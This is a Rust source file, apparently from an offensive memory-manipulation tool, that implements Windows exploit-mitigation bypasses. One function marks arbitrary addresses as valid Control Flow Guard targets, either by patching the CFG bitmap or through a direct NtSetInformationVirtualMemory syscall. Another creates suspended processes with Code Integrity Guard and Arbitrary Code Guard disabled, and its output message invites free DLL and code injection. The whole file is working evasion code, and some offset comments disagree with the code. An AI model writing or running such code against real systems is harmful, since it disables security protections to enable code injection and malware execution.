//! CFG (Control Flow Guard) and CIG (Code Integrity Guard) bypass techniques

use crate::error::MemoricError;
use serde_json::Value;

/// Bypass CFG by patching the CFG bitmap for a target address
/// Marks a memory region as a valid CFG call target
pub fn cfg_bypass(args: &Value) -> Result<Value, MemoricError> {
    use crate::util::parse_address;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualProtect, VirtualQuery, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE,
        PAGE_PROTECTION_FLAGS,
    };

    let target_address = args
        .get("target_address")
        .and_then(parse_address)
        .ok_or_else(|| MemoricError::MemoryAccess("Missing target_address".to_string()))?;
    let method = args
        .get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("ntsetinfo");

    tracing::warn!(
        "[EVASION] CFG bypass for 0x{:X} via {}",
        target_address,
        method
    );

    unsafe {
        match method {
            "bitmap" => {
                // Direct CFG bitmap manipulation
                // The CFG bitmap is at a fixed relative offset from LdrSystemDllInitBlock
                let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
                    .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

                let ldr_block = GetProcAddress(
                    ntdll,
                    windows::core::PCSTR(b"LdrSystemDllInitBlock\0".as_ptr()),
                );
                if ldr_block.is_none() {
                    return Err(MemoricError::WindowsApi(
                        "LdrSystemDllInitBlock not found".to_string(),
                    ));
                }
                let ldr_block_addr = ldr_block.unwrap() as usize;

                // LdrSystemDllInitBlock+0x98 = CFG bitmap on Win10+
                let cfg_bitmap_ptr = *(ldr_block_addr as *const u8).add(0x98) as *const usize;
                let cfg_bitmap = *cfg_bitmap_ptr;

                if cfg_bitmap == 0 {
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "cfg_bypass_bitmap",
                        "target_address": format!("0x{:016X}", target_address),
                        "message": "CFG bitmap is NULL — CFG appears to be disabled for this process"
                    }));
                }

                // CFG bitmap: each bit corresponds to an 8-byte aligned address range
                // bit_offset = (target_address >> 3) & 0x1
                // byte_offset = target_address >> 9
                let byte_offset = target_address >> 9;
                let bit_offset = (target_address >> 3) & 0x3F;
                let bitmap_entry = (cfg_bitmap + byte_offset as usize * 8) as *mut u64;

                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                VirtualProtect(
                    bitmap_entry as *const _,
                    8,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect,
                )
                .map_err(|e| {
                    MemoricError::MemoryAccess(format!("VirtualProtect CFG bitmap: {}", e))
                })?;

                let old_val = *bitmap_entry;
                *bitmap_entry |= 1u64 << bit_offset;
                let new_val = *bitmap_entry;

                VirtualProtect(bitmap_entry as *const _, 8, old_protect, &mut old_protect).ok();

                Ok(serde_json::json!({
                    "success": true,
                    "technique": "cfg_bypass_bitmap",
                    "target_address": format!("0x{:016X}", target_address),
                    "cfg_bitmap_base": format!("0x{:016X}", cfg_bitmap),
                    "bitmap_entry": format!("0x{:016X}", bitmap_entry as usize),
                    "old_value": format!("0x{:016X}", old_val),
                    "new_value": format!("0x{:016X}", new_val),
                    "message": format!("CFG bitmap patched — 0x{:016X} is now a valid CFG call target", target_address)
                }))
            }
            "ntsetinfo" | _ => {
                // Use NtSetInformationVirtualMemory with VmCfgCallTargetInformation
                let ssn = crate::evasion::syscall::resolve_ssn("NtSetInformationVirtualMemory")
                    .map_err(|e| MemoricError::WindowsApi(format!("Cannot resolve SSN: {}", e)))?;

                let stub = crate::evasion::syscall::build_syscall_stub(ssn)?;

                // CFG_CALL_TARGET_INFO structure
                #[repr(C)]
                struct CfgCallTargetInfo {
                    offset: usize,
                    flags: usize,
                }

                // VM_INFORMATION for CfgCallTarget
                #[repr(C)]
                struct VmCfgCallTargetInfo {
                    number_of_offsets: u32,
                    _padding: u32,
                    must_be_zero: usize,
                    targets_processed: u32,
                    _padding2: u32,
                    call_targets: *mut CfgCallTargetInfo,
                }

                // Query the memory region to get allocation base
                let mut mbi = MEMORY_BASIC_INFORMATION::default();
                VirtualQuery(
                    Some(target_address as *const _),
                    &mut mbi,
                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                );

                let offset_in_region = target_address as usize - mbi.AllocationBase as usize;

                let mut call_target = CfgCallTargetInfo {
                    offset: offset_in_region,
                    flags: 0x00000001, // CFG_CALL_TARGET_VALID
                };

                let mut vm_info = VmCfgCallTargetInfo {
                    number_of_offsets: 1,
                    _padding: 0,
                    must_be_zero: 0,
                    targets_processed: 0,
                    _padding2: 0,
                    call_targets: &mut call_target,
                };

                // NtSetInformationVirtualMemory(ProcessHandle, VmInformationClass, NumberOfEntries, VirtualAddresses, VmInformation, VmInformationLength)
                type NtSetInfoFn = unsafe extern "system" fn(
                    isize,
                    u32,
                    usize,
                    *const std::ffi::c_void,
                    *mut std::ffi::c_void,
                    u32,
                ) -> i32;

                let syscall_fn: NtSetInfoFn = std::mem::transmute(stub);

                // MEMORY_RANGE_ENTRY
                #[repr(C)]
                struct MemoryRangeEntry {
                    virtual_address: *const std::ffi::c_void,
                    number_of_bytes: usize,
                }

                let range = MemoryRangeEntry {
                    virtual_address: mbi.AllocationBase,
                    number_of_bytes: mbi.RegionSize,
                };

                let status = syscall_fn(
                    -1isize, // NtCurrentProcess
                    2,       // VmCfgCallTargetInformation
                    1,       // NumberOfEntries
                    &range as *const _ as *const std::ffi::c_void,
                    &mut vm_info as *mut _ as *mut std::ffi::c_void,
                    std::mem::size_of::<VmCfgCallTargetInfo>() as u32,
                );

                if status == 0 {
                    Ok(serde_json::json!({
                        "success": true,
                        "technique": "cfg_bypass_ntsetinfo",
                        "target_address": format!("0x{:016X}", target_address),
                        "status": "STATUS_SUCCESS",
                        "message": format!("0x{:016X} added as valid CFG call target via NtSetInformationVirtualMemory", target_address)
                    }))
                } else {
                    Ok(serde_json::json!({
                        "success": false,
                        "technique": "cfg_bypass_ntsetinfo",
                        "target_address": format!("0x{:016X}", target_address),
                        "status": format!("0x{:08X}", status),
                        "message": format!("NtSetInformationVirtualMemory returned 0x{:08X}", status)
                    }))
                }
            }
        }
    }
}

/// Bypass CIG (Code Integrity Guard) / ACG (Arbitrary Code Guard) via process attribute spoofing
/// Creates a child process with CIG disabled by manipulating creation attributes
pub fn cig_bypass(args: &Value) -> Result<Value, MemoricError> {
    let target_exe = args
        .get("target_exe")
        .and_then(|v| v.as_str())
        .unwrap_or("notepad.exe");
    let disable_acg = args
        .get("disable_acg")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let disable_cig = args
        .get("disable_cig")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    tracing::warn!(
        "[EVASION] CIG/ACG bypass: spawning {} with protections disabled",
        target_exe
    );

    // Use PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY to disable CIG/ACG
    // This only works for child process creation, not on existing processes
    let mut policy_flags = Vec::new();
    if disable_cig {
        policy_flags.push("CIG disabled (BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_OFF)");
    }
    if disable_acg {
        policy_flags.push("ACG disabled (DYNAMIC_CODE_ALLOW)");
    }

    unsafe {
        use windows::Win32::System::Memory::{GetProcessHeap, HeapAlloc, HEAP_ZERO_MEMORY};
        use windows::Win32::System::Threading::*;

        // PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
        let attr_count = 1usize;

        // InitializeProcThreadAttributeList to get the size
        let mut size = 0usize;
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
            1,
            0,
            &mut size,
        );

        let attr_list_buf = HeapAlloc(GetProcessHeap().unwrap(), HEAP_ZERO_MEMORY, size);
        if attr_list_buf.is_null() {
            return Err(MemoricError::MemoryAccess(
                "Failed to allocate attribute list".to_string(),
            ));
        }

        let attr_list = LPPROC_THREAD_ATTRIBUTE_LIST(attr_list_buf as *mut _);
        InitializeProcThreadAttributeList(attr_list, 1, 0, &mut size).map_err(|e| {
            MemoricError::WindowsApi(format!("InitializeProcThreadAttributeList: {}", e))
        })?;

        // Mitigation policy: disable CIG and/or ACG
        // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_OFF = 0x100000000000
        // PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_OFF = 0x1000000000
        let mut mitigation_policy: u64 = 0;
        if disable_cig {
            mitigation_policy |= 0x100000000000u64; // BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_OFF
        }
        if disable_acg {
            mitigation_policy |= 0x1000000000u64; // PROHIBIT_DYNAMIC_CODE_ALWAYS_OFF
        }

        UpdateProcThreadAttribute(
            attr_list,
            0,
            0x00020007, // PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
            Some(&mitigation_policy as *const _ as *const std::ffi::c_void),
            std::mem::size_of::<u64>(),
            None,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("UpdateProcThreadAttribute: {}", e)))?;

        // Create the process with extended attributes
        let mut si = STARTUPINFOEXW::default();
        si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
        si.lpAttributeList = attr_list;

        let mut pi = PROCESS_INFORMATION::default();

        let mut cmd: Vec<u16> = target_exe.encode_utf16().collect();
        cmd.push(0);

        let result = CreateProcessW(
            None,
            windows::core::PWSTR(cmd.as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            None,
            None,
            &si.StartupInfo,
            &mut pi,
        );

        DeleteProcThreadAttributeList(attr_list);

        match result {
            Ok(()) => {
                let pid = pi.dwProcessId;
                let tid = pi.dwThreadId;

                Ok(serde_json::json!({
                    "success": true,
                    "technique": "cig_acg_bypass",
                    "target_exe": target_exe,
                    "pid": pid,
                    "tid": tid,
                    "process_handle": format!("0x{:X}", pi.hProcess.0 as usize),
                    "thread_handle": format!("0x{:X}", pi.hThread.0 as usize),
                    "policies_disabled": policy_flags,
                    "state": "suspended",
                    "message": format!("{} (PID {}) created suspended with CIG/ACG disabled. Inject non-Microsoft DLLs or dynamic code freely.", target_exe, pid)
                }))
            }
            Err(e) => Err(MemoricError::WindowsApi(format!(
                "CreateProcessW failed: {}",
                e
            ))),
        }
    }
}
